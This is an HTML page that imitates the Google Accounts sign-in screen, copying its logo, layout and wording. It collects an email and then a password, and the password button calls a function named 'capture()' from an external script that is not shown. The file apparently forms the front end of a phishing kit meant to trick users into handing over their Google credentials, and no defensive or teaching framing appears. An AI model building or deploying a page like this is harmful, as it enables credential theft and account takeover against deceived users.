<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f7f7f7; }
        .card { background: white; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; width: 350px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; }
        .logo { width: 75px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo">
        <div id="email-section">
            <h3>Sign in</h3>
            <p>Use your Google Account</p>
            <input type="email" id="email" placeholder="Email or phone" required>
            <button onclick="showPassword()">Next</button>
        </div>
        <div id="password-section" style="display:none;">
            <h3>Welcome</h3>
            <p id="display-email" style="font-weight:bold;"></p>
            <input type="password" id="password" placeholder="Enter your password" required>
            <button onclick="capture()">Next</button>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
